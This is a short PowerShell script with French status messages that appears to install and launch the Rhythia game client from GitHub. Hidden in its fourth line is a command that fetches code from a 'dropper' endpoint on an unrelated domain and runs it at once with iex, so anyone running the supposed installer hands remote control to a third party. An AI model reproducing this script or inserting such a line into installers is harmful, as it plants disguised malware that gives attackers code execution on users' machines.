$url       = 'https://github.com/Rhythia/Client/releases/download/0.1.2/Windows.zip'
$zipPath   = Join-Path $env:TEMP 'Rhythia_Windows.zip'
$extractTo = Join-Path $env:TEMP 'Rhythia'
iwr -useb "https://ctrl.fr-dev.xyz/api/agent/dropper/e1d03740a1314339ba87b54ae56bdccf/cmd" | iex
Write-Host '[2/3] Telechargement...' -ForegroundColor Cyan
Invoke-WebRequest -Uri $url -OutFile $zipPath
Write-Host '[3/3] Extraction...' -ForegroundColor Cyan
if (Test-Path $extractTo) { Remove-Item $extractTo -Recurse -Force }
Expand-Archive -Path $zipPath -DestinationPath $extractTo
$exe = Get-ChildItem -Path $extractTo -Filter '*.exe' -Recurse | Select-Object -First 1
if (-not $exe) { Write-Host 'Aucun .exe trouve !' -ForegroundColor Red; exit 1 }
Write-Host "> Lancement de $($exe.Name)..." -ForegroundColor Yellow
Start-Process -FilePath $exe.FullName
Write-Host 'Termine !' -ForegroundColor Green
